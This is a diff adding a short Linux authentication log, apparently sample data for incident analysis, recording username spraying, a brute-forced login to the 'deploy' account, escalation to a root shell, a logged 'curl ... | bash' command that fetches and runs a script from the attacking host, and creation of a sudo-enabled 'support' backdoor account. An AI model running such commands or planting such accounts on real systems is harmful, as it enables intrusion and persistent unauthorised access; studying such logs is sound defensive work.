@@ -1,0 +1,21 @@
+2026-10-31T09:15:02+07:00 web01 sshd[2211]: Accepted publickey for deploy from 10.0.0.5 port 50122 ssh2
+2026-10-31T09:20:41+07:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+2026-10-31T11:02:10+07:00 web01 sshd[4410]: Failed password for invalid user admin from 203.0.113.45 port 40011 ssh2
+2026-10-31T11:02:11+07:00 web01 sshd[4411]: Failed password for invalid user admin from 203.0.113.45 port 40015 ssh2
+2026-10-31T11:02:13+07:00 web01 sshd[4412]: Failed password for invalid user root from 203.0.113.45 port 40020 ssh2
+2026-10-31T11:02:14+07:00 web01 sshd[4413]: Failed password for invalid user test from 203.0.113.45 port 40026 ssh2
+2026-10-31T11:02:16+07:00 web01 sshd[4414]: Failed password for invalid user oracle from 203.0.113.45 port 40031 ssh2
+2026-10-31T11:02:18+07:00 web01 sshd[4415]: Failed password for invalid user postgres from 203.0.113.45 port 40037 ssh2
+2026-10-31T11:02:20+07:00 web01 sshd[4416]: Failed password for invalid user ubuntu from 203.0.113.45 port 40041 ssh2
+2026-10-31T14:30:00+07:00 web01 sshd[8001]: Failed password for deploy from 192.0.2.77 port 51000 ssh2
+2026-10-31T14:30:03+07:00 web01 sshd[8002]: Failed password for deploy from 192.0.2.77 port 51004 ssh2
+2026-10-31T14:30:05+07:00 web01 sshd[8003]: Failed password for deploy from 192.0.2.77 port 51009 ssh2
+2026-10-31T14:30:08+07:00 web01 sshd[8004]: Failed password for deploy from 192.0.2.77 port 51015 ssh2
+2026-10-31T14:30:11+07:00 web01 sshd[8005]: Failed password for deploy from 192.0.2.77 port 51022 ssh2
+2026-10-31T14:30:14+07:00 web01 sshd[8006]: Failed password for deploy from 192.0.2.77 port 51028 ssh2
+2026-10-31T14:30:17+07:00 web01 sshd[8007]: Accepted password for deploy from 192.0.2.77 port 51033 ssh2
+2026-10-31T14:31:00+07:00 web01 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+2026-10-31T14:31:45+07:00 web01 sudo: deploy : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c curl http://192.0.2.77/x.sh | bash
+2026-10-31T14:32:30+07:00 web01 useradd[8120]: new user: name=support, UID=1050, GID=1050, home=/home/support, shell=/bin/bash
+2026-10-31T14:32:31+07:00 web01 gpasswd[8121]: add 'support' to group 'sudo'
+2026-10-31T16:00:00+07:00 web01 sshd[9500]: Accepted password for root from 10.0.0.5 port 52200 ssh2
